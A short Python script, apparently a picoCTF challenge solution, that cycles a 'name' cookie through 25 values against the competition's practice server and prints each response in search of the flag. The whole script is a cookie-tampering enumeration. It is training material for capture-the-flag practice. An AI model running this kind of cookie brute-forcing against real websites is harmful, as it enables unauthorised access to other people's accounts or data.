import requests


for i in range(25):
    session = requests.Session()
    batch = {"name":f"{i}"}
    response = session.get("http://mercury.picoctf.net:54219", cookies=batch)
    print(response.text)
